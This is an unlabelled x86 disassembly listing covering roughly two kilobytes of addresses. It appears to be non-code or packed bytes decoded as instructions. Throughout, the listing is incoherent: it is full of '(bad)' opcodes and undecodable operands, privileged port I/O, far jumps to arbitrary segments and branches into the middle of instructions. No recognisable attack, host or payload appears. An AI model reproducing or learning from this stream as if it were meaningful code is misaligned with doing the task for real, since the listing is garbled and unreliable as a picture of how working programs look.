  408f24:	sbb    esp,DWORD PTR [ecx]
  408f26:	inc    edx
  408f27:	mov    esp,0x2b48c41a
  408f2c:	aas    
  408f2d:	mov    ch,0xc6
  408f2f:	pop    ss
  408f30:	pop    ds
  408f31:	adc    DWORD PTR [ebp-0xc637e85],esp
  408f37:	in     al,dx
  408f38:	push   edi
  408f39:	mov    dh,0x30
  408f3b:	(bad)  
  408f3c:	call   0xb3ad891
  408f41:	sti    
  408f42:	mul    esp
  408f44:	jmp    0x6312:0x6fc5a1b6
  408f4b:	push   ds
  408f4c:	popf   
  408f4d:	(bad)  
  408f4e:	dec    ecx
  408f4f:	shl    ah,cl
  408f51:	jp     0x408ee4
  408f53:	aas    
  408f54:	imul   edi,DWORD PTR [ecx-0x1233bca8],0x343782f3
  408f5e:	mov    esp,0xd9c705e1
  408f63:	or     DWORD PTR [esi+0x37],ebp
  408f66:	push   ds
  408f67:	call   esi
  408f69:	xor    edx,esp
  408f6b:	pop    eax
  408f6c:	mov    bh,dl
  408f6e:	jp     0x408f1e
  408f70:	jno    0x408fab
  408f72:	and    ecx,DWORD PTR [eax]
  408f74:	stos   BYTE PTR es:[edi],al
  408f75:	mov    esp,0xc2e60b24
  408f7a:	inc    edi
  408f7b:	push   ebp
  408f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f7d:	sbb    dh,ah
  408f7f:	iret   
  408f80:	ja     0x408f92
  408f82:	inc    esi
  408f83:	push   es
  408f84:	outs   dx,DWORD PTR ds:[esi]
  408f85:	xchg   esi,eax
  408f86:	fld    TBYTE PTR [ebx]
  408f88:	imul   edx,DWORD PTR [ebx-0x2e],0x238b50d5
  408f8f:	jbe    0x409003
  408f91:	and    DWORD PTR [ebp+0x70],ebx
  408f94:	mov    ch,ah
  408f96:	je     0x408f98
  408f98:	adc    dl,BYTE PTR [ebp-0x6c]
  408f9b:	test   BYTE PTR [ecx-0x7d],dl
  408f9e:	(bad)  
  408f9f:	mov    edx,0x8e665ae4
  408fa4:	cs loope 0x40901f
  408fa7:	sub    BYTE PTR [eax-0x69],cl
  408faa:	sub    bh,BYTE PTR [eax+0x171b6b08]
  408fb0:	fadd   DWORD PTR [edi]
  408fb2:	dec    ecx
  408fb3:	push   ds
  408fb4:	add    ebx,DWORD PTR [ebx]
  408fb6:	jne    0x408fa2
  408fb8:	or     BYTE PTR [esi-0x682b7cf3],cl
  408fbe:	fdivr  QWORD PTR [eax]
  408fc0:	pop    edi
  408fc1:	into   
  408fc2:	add    edx,0x7f7c7a00
  408fc8:	sti    
  408fc9:	cmp    DWORD PTR [ebx],ebx
  408fcb:	add    BYTE PTR [edi],0xe1
  408fce:	push   es
  408fcf:	mov    ecx,0xbe8e4aa6
  408fd4:	out    dx,al
  408fd5:	dec    esp
  408fd6:	jo     0x408fe4
  408fd8:	push   edi
  408fd9:	xor    al,BYTE PTR [esi+0x12c36e5c]
  408fdf:	leave  
  408fe0:	in     al,dx
  408fe1:	aas    
  408fe2:	sti    
  408fe3:	mov    esi,0x4c64377
  408fe8:	cmp    eax,0x83c351e9
  408fed:	inc    esp
  408fee:	aaa    
  408fef:	imul   ecx,DWORD PTR [esi],0x5a
  408ff2:	fistp  WORD PTR [ecx]
  408ff4:	jne    0x408fea
  408ff6:	jmp    0x409075
  408ff8:	cs retf 
  408ffa:	push   ebx
  408ffb:	scas   eax,DWORD PTR es:[edi]
  408ffc:	xchg   edx,eax
  408ffd:	outs   dx,BYTE PTR ds:[esi]
  408ffe:	call   0xd176eaf3
  409003:	ror    edx,1
  409005:	pop    es
  409006:	mov    ebp,0x64da728c
  40900b:	xchg   edi,eax
  40900c:	jge    0x408fbd
  40900e:	jae    0x408fee
  409010:	mov    al,0x9e
  409012:	outs   dx,BYTE PTR ds:[esi]
  409013:	sbb    dh,al
  409015:	cmp    DWORD PTR [esi+0x52],ebx
  409018:	inc    esp
  409019:	lds    ebp,FWORD PTR [ecx]
  40901b:	mov    ecx,0xce65ce6e
  409020:	ja     0x408fe6
  409022:	mov    dh,0xe1
  409024:	pusha  
  409025:	mov    DWORD PTR [eax+ebx*2],eax
  409028:	addr16 iret 
  40902a:	ins    DWORD PTR es:[edi],dx
  40902b:	mov    ss,WORD PTR [edi+0x2e]
  40902e:	mov    eax,0x8baf1e82
  409033:	sbb    ah,BYTE PTR [edi+0x47]
  409036:	stos   BYTE PTR es:[edi],al
  409037:	(bad)  
  409038:	call   0xde56:0xb62250e5
  40903f:	repnz mov ebp,DWORD PTR ds:[eax+0x72]
  409044:	loopne 0x408fc6
  409046:	mov    ch,0xa7
  409048:	cmc    
  409049:	xchg   BYTE PTR [ebp+0x0],bh
  40904c:	into   
  40904d:	test   BYTE PTR [edi],0xac
  409050:	dec    ecx
  409051:	push   0x4429b484
  409056:	stc    
  409057:	daa    
  409058:	jmp    0x8164:0x1005c09e
  40905f:	jecxz  0x409066
  409061:	mov    dl,0xfd
  409063:	add    al,0x86
  409065:	push   ds
  409066:	in     eax,dx
  409067:	jo     0x40900e
  409069:	stos   DWORD PTR es:[edi],eax
  40906a:	gs pop esi
  40906c:	clc    
  40906d:	leave  
  40906e:	iret   
  40906f:	sbb    ah,BYTE PTR [esi+0x76]
  409072:	jle    0x40908c
  409074:	cs cmc 
  409076:	push   esi
  409077:	stc    
  409078:	push   eax
  409079:	or     BYTE PTR [edx-0x50],0xa6
  40907d:	call   0x4b5:0x930e5247
  409084:	arpl   bp,cx
  409086:	imul   edi
  409088:	enter  0xcbb2,0x12
  40908c:	jns    0x409045
  40908e:	stc    
  40908f:	mov    esp,DWORD PTR ds:0xa69e18cf
  409095:	dec    esp
  409096:	lock lods al,BYTE PTR ds:[esi]
  409098:	xor    edx,0x4d168e68
  40909e:	pop    edi
  40909f:	ret    0xc0f4
  4090a2:	mov    al,ds:0x53b7a95b
  4090a7:	dec    edi
  4090a8:	(bad)  
  4090a9:	lock popf 
  4090ab:	jle    0x4090ef
  4090ad:	lock rcr BYTE PTR ds:0xf97fa7a9,0xd8
  4090b5:	jg     0x4090f0
  4090b7:	call   0x9839:0xfa775955
  4090be:	(bad)  
  4090bf:	stos   DWORD PTR es:[edi],eax
  4090c0:	mov    edx,0x28618613
  4090c5:	out    0x85,eax
  4090c7:	mov    esi,0x7ed00378
  4090cc:	push   0x391f7dc0
  4090d1:	jae    0x4090be
  4090d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090d4:	lds    ebp,FWORD PTR [ebx*8+0x4de14e48]
  4090db:	dec    edx
  4090dc:	mov    bh,BYTE PTR [ebx+0x5406e93f]
  4090e2:	push   ss
  4090e3:	ins    DWORD PTR es:[edi],dx
  4090e4:	jecxz  0x409102
  4090e6:	sbb    ebp,DWORD PTR [esi+0x6e]
  4090e9:	sbb    eax,0xa431d50b
  4090ee:	inc    esp
  4090ef:	inc    eax
  4090f0:	ins    DWORD PTR es:[edi],dx
  4090f1:	mov    al,ds:0x60ca04c2
  4090f6:	push   ebx
  4090f7:	add    cl,ah
  4090f9:	mov    cl,0xbf
  4090fb:	pop    ss
  4090fc:	fsubr  DWORD PTR [esp+esi*2]
  4090ff:	into   
  409100:	push   0x60
  409102:	rcr    ebx,cl
  409104:	jmp    0x45a70f90
  409109:	popa   
  40910a:	ja     0x40914d
  40910c:	cmp    BYTE PTR [ebx-0x183d106c],al
  409112:	xchg   ebp,eax
  409113:	inc    ebx
  409114:	outs   dx,DWORD PTR ds:[esi]
  409115:	xchg   DWORD PTR [ebp-0x5],ebp
  409118:	shl    BYTE PTR [eax+0x6b],cl
  40911b:	mov    ?,WORD PTR [ebx+0x1d044088]
  409121:	scas   eax,DWORD PTR es:[edi]
  409122:	sub    ch,BYTE PTR [eax+0x3d]
  409125:	jg     0x4090f9
  409127:	(bad)  
  409128:	and    edi,DWORD PTR [edx-0x1a16ae9e]
  40912e:	js     0x409144
  409130:	lds    esi,FWORD PTR [esi-0x67]
  409133:	cdq    
  409134:	cmp    al,0xaf
  409136:	lea    ebp,[edx]
  409138:	dec    ecx
  409139:	xchg   esp,eax
  40913a:	xchg   ebx,eax
  40913b:	cdq    
  40913c:	sbb    BYTE PTR [esi-0x6c],bl
  40913f:	fmul   DWORD PTR [edi+0x2c4e704d]
  409145:	pop    ds
  409146:	mov    ch,BYTE PTR [eax+0x4ff9ea3b]
  40914c:	sub    DWORD PTR [edx+0x7c0c7dac],esi
  409152:	cmp    eax,0xc5b62138
  409157:	jo     0x40916a
  409159:	pop    ebx
  40915a:	dec    edx
  40915b:	mov    esi,0x7cfd3f03
  409160:	icebp  
  409161:	aas    
  409162:	iret   
  409163:	dec    esi
  409164:	jmp    0xf73a534c
  409169:	aam    0x3b
  40916b:	test   DWORD PTR [esi],ecx
  40916d:	pop    ebp
  40916e:	mov    edi,0xebe8d50
  409173:	int3   
  409174:	in     eax,dx
  409175:	jns    0x409141
  409177:	sahf   
  409178:	cld    
  409179:	xor    eax,0xdc1bc4a9
  40917e:	aad    0x26
  409180:	and    edx,ebp
  409182:	hlt    
  409183:	cmp    eax,0xdd22ea8f
  409188:	les    ebp,FWORD PTR [esi-0x3c]
  40918b:	sub    DWORD PTR [edx+edi*8],esp
  40918e:	add    al,0x7f
  409190:	pop    ss
  409191:	push   cs
  409192:	dec    ecx
  409193:	pop    edx
  409194:	(bad)  
  409195:	int    0xac
  409197:	sbb    ecx,ebp
  409199:	and    al,cl
  40919b:	(bad)  
  40919c:	in     al,0x3d
  40919e:	push   ss
  40919f:	std    
  4091a0:	in     eax,dx
  4091a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a2:	or     eax,0xfa3e8813
  4091a7:	mov    edi,0x5d747e5b
  4091ac:	add    BYTE PTR [ebp-0x3],cl
  4091af:	fdivr  DWORD PTR [ebx+ebx*8-0x236936a6]
  4091b6:	popa   
  4091b7:	xor    eax,0x7df196b1
  4091bc:	mov    dh,0xbc
  4091be:	mov    bh,0x12
  4091c0:	inc    esi
  4091c1:	dec    esp
  4091c2:	hlt    
  4091c3:	test   cl,al
  4091c5:	into   
  4091c6:	jne    0x409175
  4091c8:	cmp    dh,BYTE PTR [edi+0x31a665cc]
  4091ce:	and    ch,BYTE PTR [esi+0x3030b2f3]
  4091d4:	fadd   DWORD PTR [esi+0x7c881a0e]
  4091da:	retf   0x83c8
  4091dd:	test   al,0xaa
  4091df:	cld    
  4091e0:	xchg   DWORD PTR [ebx-0x18160b54],eax
  4091e6:	xchg   edx,eax
  4091e7:	lods   al,BYTE PTR ds:[esi]
  4091e8:	out    0xd2,eax
  4091ea:	in     al,0x14
  4091ec:	mov    al,ds:0x57f93852
  4091f1:	daa    
  4091f2:	rcl    esi,cl
  4091f4:	addr16 int 0x37
  4091f7:	xchg   edx,eax
  4091f8:	cmp    ecx,0x1699a6e6
  4091fe:	jl     0x4091b0
  409200:	jecxz  0x409218
  409202:	sbb    al,BYTE PTR [edi+0x59831616]
  409208:	and    esp,DWORD PTR [eax+ebx*8+0x1ed16331]
  40920f:	jp     0x409290
  409211:	lahf   
  409212:	mov    dl,0x5d
  409214:	cmp    eax,0x6bd309ed
  409219:	jmp    0x4091a4
  40921b:	lock neg DWORD PTR [edx-0x672a0152]
  409222:	sbb    dh,BYTE PTR [esi]
  409224:	add    edx,esi
  409226:	inc    DWORD PTR [eax]
  409228:	int    0x2e
  40922a:	loopne 0x4091c6
  40922c:	cmp    ebx,DWORD PTR [ecx+0x6ebf0057]
  409232:	jbe    0x4091cd
  409234:	sub    al,0x6c
  409236:	icebp  
  409237:	mov    ch,dh
  409239:	adc    al,0xdc
  40923b:	or     dh,BYTE PTR [ebp-0x42]
  40923e:	sbb    DWORD PTR [ebx],edx
  409240:	jb     0x40925b
  409242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409243:	ja     0x409255
  409245:	and    BYTE PTR [ebp+0x2a],ah
  409248:	sub    bl,BYTE PTR [eax-0xa]
  40924b:	(bad)  
  40924c:	out    dx,eax
  40924d:	push   0x54
  40924f:	xchg   ebx,eax
  409250:	std    
  409251:	lods   al,BYTE PTR ds:[esi]
  409252:	sbb    al,0x3d
  409254:	das    
  409255:	mov    dl,0xdd
  409257:	popf   
  409258:	inc    edx
  409259:	dec    ebp
  40925a:	stos   BYTE PTR es:[edi],al
  40925b:	into   
  40925c:	pusha  
  40925d:	add    eax,0x198ac6cc
  409262:	adc    edx,DWORD PTR [eax]
  409264:	ds data16 ffreep st(0)
  409268:	cs and ch,bl
  40926b:	mov    dh,0x59
  40926d:	push   esi
  40926e:	aam    0x10
  409270:	push   edi
  409271:	gs sub ch,0x7c
  409275:	mov    bh,0x79
  409277:	sub    edx,DWORD PTR [esi-0x17]
  40927a:	jg     0x4092d9
  40927c:	sub    dl,dl
  40927e:	pop    ds
  40927f:	mov    al,ds:0xeb50795d
  409284:	adc    al,0x2f
  409286:	sbb    al,0x9d
  409288:	test   esp,esp
  40928a:	out    0x7e,eax
  40928c:	jecxz  0x4092f1
  40928e:	out    dx,eax
  40928f:	popa   
  409290:	cwde   
  409291:	std    
  409292:	imul   edx,DWORD PTR [ecx-0x19cee9f4],0x58b8e1b5
  40929c:	out    dx,al
  40929d:	maxps  xmm3,XMMWORD PTR ds:0xb475dfa3
  4092a4:	stos   BYTE PTR es:[edi],al
  4092a5:	ret    
  4092a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092a7:	sbb    DWORD PTR [esi+0x76],ebp
  4092aa:	enter  0x6c03,0xbd
  4092ae:	ins    BYTE PTR es:[edi],dx
  4092af:	inc    eax
  4092b0:	loop   0x409244
  4092b2:	not    DWORD PTR [esi]
  4092b4:	xor    esi,ecx
  4092b6:	add    al,0x1f
  4092b8:	push   edx
  4092b9:	mov    al,ds:0x8fb6f0a2
  4092be:	push   eax
  4092bf:	es push ss
  4092c1:	in     eax,dx
  4092c2:	and    bh,BYTE PTR ds:0x6ce78c18
  4092c8:	or     cl,BYTE PTR [ecx-0xc]
  4092cb:	div    DWORD PTR [esi+0x48]
  4092ce:	pop    ebx
  4092cf:	fwait
  4092d0:	mov    ah,0x58
  4092d2:	pop    eax
  4092d3:	xchg   edx,eax
  4092d4:	cli    
  4092d5:	xchg   ecx,eax
  4092d6:	pop    ss
  4092d7:	fcom   QWORD PTR [ecx-0x7b65b043]
  4092dd:	xor    eax,0x6b3cc778
  4092e2:	lds    eax,FWORD PTR [edx+edi*1-0x4aea5a80]
  4092e9:	mov    edi,0xcde2f917
  4092ee:	mov    bh,BYTE PTR [edx-0x5cebd00c]
  4092f4:	xchg   edi,eax
  4092f5:	mov    ?,WORD PTR [ebp+0x1f]
  4092f8:	mov    ebp,0x8f0f4d90
  4092fd:	mov    al,0xf
  4092ff:	sub    ecx,edi
  409301:	cmp    dh,BYTE PTR [ecx+0x13]
  409304:	mov    al,0x1b
  409306:	sahf   
  409307:	ins    DWORD PTR es:[edi],dx
  409308:	sub    al,0x69
  40930a:	fucomip st,st(6)
  40930c:	add    al,0x22
  40930e:	cld    
  40930f:	rcl    esi,cl
  409311:	push   edx
  409312:	nop
  409313:	push   edi
  409314:	in     eax,0xaf
  409316:	addr16 adc al,0xcd
  409319:	mov    ds:0xb474036c,eax
  40931e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40931f:	ins    BYTE PTR es:[edi],dx
  409320:	dec    esp
  409321:	adc    BYTE PTR [ecx-0x6c],cl
  409324:	fidiv  WORD PTR [edi]
  409326:	adc    BYTE PTR [edi-0x2661c0d6],bl
  40932c:	jecxz  0x4092ba
  40932e:	test   DWORD PTR [ecx],ecx
  409330:	arpl   WORD PTR [esi],ax
  409332:	or     eax,0x775277c0
  409337:	mov    ebp,0xd55c525f
  40933c:	dec    edi
  40933d:	or     eax,0x166f26f0
  409342:	push   0x73eae662
  409347:	loop   0x4093c6
  409349:	push   esi
  40934a:	mov    ah,0xee
  40934c:	loopne 0x409342
  40934e:	lea    edx,[edi]
  409350:	xchg   edx,eax
  409351:	inc    ebx
  409352:	mov    ecx,0x329adb79
  409357:	pop    edi
  409358:	sub    bh,0x4f
  40935b:	es je  0x409355
  40935e:	aam    0xaa
  409360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409361:	add    eax,0x757f1b38
  409366:	addr16 ds mov bl,0x19
  40936a:	jp     0x4093a0
  40936c:	xchg   ebp,eax
  40936d:	imul   edi,DWORD PTR ds:0x4b75a78,0xffffffaf
  409374:	fidiv  DWORD PTR [edx+0x341f261]
  40937a:	lahf   
  40937b:	aam    0xf1
  40937d:	pop    edx
  40937e:	jb     0x409319
  409380:	dec    ecx
  409381:	jmp    0xb36d:0x2622d57f
  409388:	push   ebx
  409389:	test   DWORD PTR [edi],esi
  40938b:	rol    BYTE PTR [ebx-0x71b32f6e],cl
  409391:	repz leave 
  409393:	mov    DWORD PTR [edx+0x52],eax
  409396:	lods   al,BYTE PTR ds:[esi]
  409397:	dec    edi
  409398:	frstor [esi-0x54]
  40939b:	or     edi,DWORD PTR [ecx]
  40939d:	repz xlat BYTE PTR ds:[ebx]
  40939f:	mov    esp,edi
  4093a1:	sbb    ebx,esi
  4093a3:	sub    DWORD PTR [edx+0x1a133b5e],0xcb201d52
  4093ad:	int3   
  4093ae:	dec    eax
  4093af:	dec    eax
  4093b0:	repnz aad 0x36
  4093b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b4:	push   edx
  4093b5:	inc    edi
  4093b6:	or     edx,edx
  4093b8:	or     esi,DWORD PTR [ebp-0x1b330402]
  4093be:	jo     0x4093b2
  4093c0:	jp     0x4093d7
  4093c2:	pop    ss
  4093c3:	mov    edi,0x2495b6fb
  4093c8:	test   al,0xe8
  4093ca:	mov    ds:0xc29f3d29,eax
  4093cf:	add    BYTE PTR [edi],dh
  4093d1:	push   esp
  4093d2:	les    eax,FWORD PTR [eax+esi*8+0xd5c3028]
  4093d9:	shr    DWORD PTR [edx],1
  4093db:	ds xchg esi,eax
  4093dd:	ins    BYTE PTR es:[edi],dx
  4093de:	push   ebx
  4093df:	sbb    BYTE PTR [ebx],ah
  4093e1:	add    DWORD PTR [edi+0x24ece215],esp
  4093e7:	fdivr  st(4),st
  4093e9:	mov    bh,0x94
  4093eb:	aaa    
  4093ec:	mov    dh,0x51
  4093ee:	iret   
  4093ef:	inc    ecx
  4093f0:	loope  0x409454
  4093f2:	inc    edi
  4093f3:	call   0x894758f5
  4093f8:	dec    edi
  4093f9:	jecxz  0x409450
  4093fb:	fld    TBYTE PTR [edi-0x2f7c79c7]
  409401:	adc    eax,0x8cc5c653
  409406:	mov    DWORD PTR [edx],0x18d86dbb
  40940c:	cld    
  40940d:	xor    dh,BYTE PTR [esi]
  40940f:	xor    eax,0x437e441c
  409414:	mov    dh,0x9
  409416:	fcmovb st,st(2)
  409418:	shr    BYTE PTR [esi],0x48
  40941b:	push   ss
  40941c:	add    DWORD PTR [edi],ebp
  40941e:	idiv   BYTE PTR [edx-0x4]
  409421:	jo     0x409438
  409423:	and    DWORD PTR [ecx+0x5bc08daa],ebx
  409429:	leave  
  40942a:	out    dx,eax
  40942b:	clc    
  40942c:	out    0x81,eax
  40942e:	cmp    BYTE PTR [edi],cl
  409430:	jbe    0x4093e3
  409432:	cmp    al,0xea
  409434:	sub    eax,0xb96280bc
  409439:	rcr    DWORD PTR [ebp-0x6d28b4c1],0x2a
  409440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409441:	retf   
  409442:	cs (bad) 
  409444:	adc    al,0x3a
  409446:	or     esi,DWORD PTR [edi]
  409448:	cmp    BYTE PTR [ebx-0x15],bl
  40944b:	test   BYTE PTR [esp+eiz*4],bl
  40944e:	cmp    bl,cl
  409450:	cld    
  409451:	cmp    BYTE PTR [eax],dl
  409453:	scas   al,BYTE PTR es:[edi]
  409454:	adc    eax,DWORD PTR [ebx-0x42]
  409457:	test   BYTE PTR [edi+0x60],dh
  40945a:	loop   0x4094c5
  40945c:	xchg   BYTE PTR [edx+0x1158291a],ch
  409462:	lods   eax,DWORD PTR ds:[esi]
  409463:	inc    edi
  409464:	jnp    0x409447
  409466:	and    al,0x46
  409468:	aam    0x8
  40946a:	xor    eax,0x289c43bc
  40946f:	aad    0x15
  409471:	mov    esp,0xca062b19
  409476:	jns    0x409452
  409478:	mov    cl,0x91
  40947a:	xchg   edi,eax
  40947b:	shl    DWORD PTR [edi],cl
  40947d:	retf   0xd76a
  409480:	outs   dx,DWORD PTR ds:[esi]
  409481:	int3   
  409482:	mov    dh,0xf2
  409484:	mov    ds:0x16f4d280,al
  409489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40948a:	cmp    bl,BYTE PTR [esi-0x56b28b7]
  409490:	inc    edi
  409491:	and    DWORD PTR [edx+0x5b],esp
  409494:	leave  
  409495:	test   al,0x41
  409497:	les    ecx,FWORD PTR [esp+eax*1]
  40949a:	push   ecx
  40949b:	test   eax,0x9216da99
  4094a0:	dec    ebx
  4094a1:	jmp    DWORD PTR ds:0xe068b3a2
  4094a7:	dec    edx
  4094a8:	gs cdq 
  4094aa:	pop    edx
  4094ab:	xor    BYTE PTR [esi],0xb1
  4094ae:	pop    edi
  4094af:	xchg   edi,eax
  4094b0:	das    
  4094b1:	dec    edi
  4094b2:	cmp    al,0xfc
  4094b4:	pop    es
  4094b5:	mov    dl,bl
  4094b7:	mov    bl,0x33
  4094b9:	inc    edx
  4094ba:	jg     0x409473
  4094bc:	xor    BYTE PTR gs:0xe2c8162,ah
  4094c3:	or     eax,0x23a61075
  4094c8:	inc    edx
  4094c9:	sar    DWORD PTR [edx-0x78097851],cl
  4094cf:	and    eax,0x2d56844c
  4094d4:	int    0xed
  4094d6:	adc    BYTE PTR [edx+ebx*4+0xcd29512],al
  4094dd:	es inc edx
  4094df:	mov    bl,0x9b
  4094e1:	adc    eax,0xc6fd21e7
  4094e6:	out    dx,eax
  4094e7:	pop    eax
  4094e8:	jns    0x409527
  4094ea:	or     al,0x3a
  4094ec:	imul   esi,eax,0x0
  4094ef:	test   BYTE PTR [edx*8-0x5b2f3a61],bl
  4094f6:	xor    al,0x2e
  4094f8:	fdivr  DWORD PTR [ecx+ecx*8+0x23]
  4094fc:	rcr    DWORD PTR [ecx+0x151ea84b],cl
  409502:	mov    bh,0x52
  409504:	cmc    
  409505:	loope  0x409567
  409507:	sbb    ch,BYTE PTR [edi-0x67a9c660]
  40950d:	repz loop 0x40953d
  409510:	cdq    
  409511:	rol    DWORD PTR [ecx],cl
  409513:	add    dh,BYTE PTR [ebx-0x5d]
  409516:	inc    ecx
  409517:	mov    cl,0xce
  409519:	mov    ds:0x2bbf107b,al
  40951e:	mov    edi,0x31eff5ec
  409523:	int3   
  409524:	test   eax,0xdcc6ebac
  409529:	mov    cs,WORD PTR [edi]
  40952b:	(bad)  
  40952c:	std    
  40952d:	sub    ebp,DWORD PTR [ecx+0x7c2836f]
  409533:	je     0x4094f4
  409535:	loop   0x4095b1
  409537:	push   ebp
  409538:	pushf  
  409539:	adc    ecx,edi
  40953b:	add    BYTE PTR [ebx-0x79fb6f],0xb0
  409542:	pop    es
  409543:	mov    al,0xd4
  409545:	mov    eax,0xe26decef
  40954a:	fdivr  st,st(2)
  40954c:	out    dx,eax
  40954d:	and    ebx,edx
  40954f:	add    al,0x6e
  409551:	(bad)  [esi-0x5a]
  409554:	test   al,0xc5
  409556:	jp     0x409576
  409558:	sub    eax,0x93783213
  40955d:	mov    dl,0x4c
  40955f:	scas   al,BYTE PTR es:[edi]
  409560:	sti    
  409561:	jmp    0x409598
  409563:	sar    DWORD PTR [ecx],0x62
  409566:	rcl    DWORD PTR [ecx-0x1c80e0c],1
  40956c:	mov    bl,0x4b
  40956e:	test   BYTE PTR [ebp-0x7efb82b3],dl
  409574:	retf   
  409575:	das    
  409576:	sub    ebp,DWORD PTR [edi]
  409578:	ret    0xaf69
  40957b:	dec    esi
  40957c:	mov    dh,0x29
  40957e:	adc    dl,BYTE PTR [edi+0x8]
  409581:	out    0xd1,eax
  409583:	xor    al,0x90
  409585:	adc    ebp,DWORD PTR [eax]
  409587:	js     0x4095ae
  409589:	dec    edx
  40958a:	sub    BYTE PTR [ecx],ah
  40958c:	ss jmpw 0x7b0a
  409591:	lds    esp,FWORD PTR [edx+ebp*4]
  409594:	(bad)  
  409595:	adc    DWORD PTR [ebp-0x5dce5aad],ebp
  40959b:	push   edi
  40959c:	mov    edx,0x115c3863
  4095a1:	imul   ebp,DWORD PTR [esi-0x8],0xffa5b6a2
  4095a8:	mov    ebp,0xee03996e
  4095ad:	pop    ds
  4095ae:	add    edx,esi
  4095b0:	push   ss
  4095b1:	inc    esi
  4095b2:	cmp    eax,0xd5010fad
  4095b7:	rcr    BYTE PTR ds:0x6d8402eb,cl
  4095bd:	jg     0x409606
  4095bf:	bound  edi,QWORD PTR [eax]
  4095c1:	js     0x4095f7
  4095c3:	stos   BYTE PTR es:[edi],al
  4095c4:	pop    ebx
  4095c5:	cmp    edi,DWORD PTR [ebp-0x78f52274]
  4095cb:	dec    ebp
  4095cc:	lahf   
  4095cd:	in     eax,0x1
  4095cf:	sub    al,0xd3
  4095d1:	mov    ebx,0x828dbb9e
  4095d6:	ret    
  4095d7:	fwait
  4095d8:	(bad)  
  4095d9:	data16 jne 0x40956b
  4095dc:	inc    ecx
  4095dd:	adc    eax,DWORD PTR [edi-0x5f8088e4]
  4095e3:	pop    eax
  4095e4:	jg     0x4095b6
  4095e6:	adc    BYTE PTR [ebx-0x7eacf65c],dh
  4095ec:	retf   0x9b6d
  4095ef:	loopne 0x409590
  4095f1:	sbb    al,0x74
  4095f3:	lea    eax,[edi+0x5a9ae6f7]
  4095f9:	pushf  
  4095fa:	dec    ecx
  4095fb:	shl    BYTE PTR [eax],1
  4095fd:	jno    0x40965d
  4095ff:	ins    BYTE PTR es:[edi],dx
  409600:	into   
  409601:	mov    edx,0x4e44b372
  409606:	in     al,0x7
  409608:	stos   BYTE PTR es:[edi],al
  409609:	popa   
  40960a:	rcr    DWORD PTR [ebp+0x9bee211],0x18
  409611:	xchg   esp,eax
  409612:	pusha  
  409613:	inc    eax
  409614:	adc    al,0x8c
  409616:	inc    ebp
  409617:	cdq    
  409618:	popf   
  409619:	xor    ecx,ebp
  40961b:	xor    ah,cl
  40961d:	push   es
  40961e:	xor    ah,BYTE PTR fs:[edi+esi*2+0x37]
  409623:	pop    ds
  409624:	mov    ds:0x4bda7105,eax
  409629:	jl     0x4095ef
  40962b:	mov    cl,0x93
  40962d:	pop    edx
  40962e:	cmp    bh,BYTE PTR [ebx-0x3ea81d23]
  409634:	jp     0x40965e
  409636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409637:	jno    0x4095f2
  409639:	das    
  40963a:	push   eax
  40963b:	test   DWORD PTR [esi+0x58],0xfa04d1a4
  409642:	push   es
  409643:	cmp    eax,0xf9c89b16
  409648:	sbb    BYTE PTR [ecx+0x3b],dl
  40964b:	(bad)  
  40964c:	mov    edx,0x9e8fbb92
  409651:	pop    ebx
  409652:	test   DWORD PTR [edx-0x60d7b4bd],esp
  409658:	dec    edi
  409659:	jne    0x4095f1
  40965b:	jnp    0x4096ae
  40965d:	add    ebx,DWORD PTR [ebx]
  40965f:	mov    esp,0x2753f0fe
  409664:	pop    esi
  409665:	loope  0x409690
  409667:	stc    
  409668:	sub    BYTE PTR [ecx+0x4b],dh
  40966b:	in     eax,0xa5
  40966d:	cmc    
  40966e:	scas   eax,DWORD PTR es:[edi]
  40966f:	imul   esp,DWORD PTR [eax+ecx*4+0x5],0x6b
  409674:	daa    
  409675:	adc    al,0x2e
  409677:	add    BYTE PTR [edi],bh
  409679:	aas    
  40967a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40967b:	mov    eax,ds:0x6aaa8187
  409680:	stos   DWORD PTR es:[edi],eax
  409681:	lods   al,BYTE PTR ds:[esi]
  409682:	fdivr  QWORD PTR [ebp+0x6a]
  409685:	(bad)  
  409686:	gs fmulp st(2),st
  409689:	push   ss
  40968a:	ficom  DWORD PTR [ebx+0x1e]
  40968d:	sub    eax,0xf2f332bb
  409692:	iret   
  409693:	cmp    DWORD PTR [esi],edx
  409695:	jae    0x409710
  409697:	retf   
  409698:	pushf  
  409699:	mov    ch,0x10
  40969b:	xlat   BYTE PTR ds:[ebx]
  40969c:	fyl2xp1 
  40969e:	frstor [ebx+0x57a27828]
  4096a4:	call   0x6c44:0x5aa586b2
  4096ab:	mov    dl,0x10
  4096ad:	cmp    al,0xf7
  4096af:	hlt    
  4096b0:	data16 sahf 
  4096b2:	sbb    DWORD PTR [ebx+0x3b9c4ea9],ebx
  4096b8:	jmp    0x1f8a695e
  4096bd:	mov    dh,0x67
  4096bf:	lods   eax,DWORD PTR ds:[esi]
  4096c0:	lea    ebx,[edi-0x4c]
  4096c3:	push   edx
  4096c4:	inc    ebp
  4096c5:	je     0x409698
  4096c7:	loope  0x409722
  4096c9:	ret    0xe7e
  4096cc:	add    bh,BYTE PTR [ecx-0x55002990]
  4096d2:	loope  0x409694
  4096d4:	out    0xe0,eax
  4096d6:	test   BYTE PTR [edx+edi*4+0x4b4b761],ah
  4096dd:	mov    esp,0x9dcc1ab6
  4096e2:	(bad)  
  4096e3:	xor    eax,0x825470c6
  4096e8:	or     eax,0x2bea057e
  4096ed:	stos   BYTE PTR es:[edi],al
  4096ee:	iret   
  4096ef:	pusha  
  4096f0:	inc    eax
  4096f1:	push   ss
  4096f2:	jno    0x4096d8
  4096f4:	mov    esi,0xfb8058d3
  4096f9:	(bad)  
  4096fa:	jns    0x409707
  4096fc:	mov    esp,0x23d6da16
  409701:	jge    0x4096bd
  409703:	es loope 0x409779
  409706:	das    
  409707:	mov    ch,0x49
